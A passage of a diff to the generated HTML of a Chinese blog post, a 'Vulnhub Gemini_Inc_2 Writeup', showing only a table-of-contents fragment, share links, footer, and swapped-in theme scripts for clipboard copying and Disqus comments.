class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1. 番外</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+    </div>
 
-
-
-
-
-    
-  <div class="comments" id="disqus_thread">
-    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
-  </div>
-  
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">hdfzzf</span>
-</div>
-<div class="wordcount">
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-line"></i>
-    </span>
-      <span>站点总字数：</span>
-    <span title="站点总字数">534k</span>
-  </span>
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">8:05</span>
-  </span>
-</div>
-<div class="busuanzi-count">
-</div>
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&text=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&title=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&is_video=false&description=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=20 Vulnhub Gemini_Inc_2 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&title=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&title=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&title=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&title=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&name=20 Vulnhub Gemini_Inc_2 Writeup&description=&lt;p&gt;该靶机难度中等，涉及redis相关漏洞。由于WAF的存在，感觉比较贴近现实。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&t=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
     </div>
-  </footer>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    hdfzzf
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
 
   
-  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
+<!-- Google Analytics -->
 
-  
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
+<!-- Umami Analytics -->
 
+<!-- Disqus Comments -->
 
-  
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
 
-  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
-<script src="/js/third-party/math/mathjax.js"></script>
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
 
-
-<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"hdfzzf","count":true,"i18n":{"disqus":"disqus"}}</script>
-<script src="/js/third-party/comments/disqus.js"></script>
+<!-- utterances Comments -->
 
 </body>
 </html>
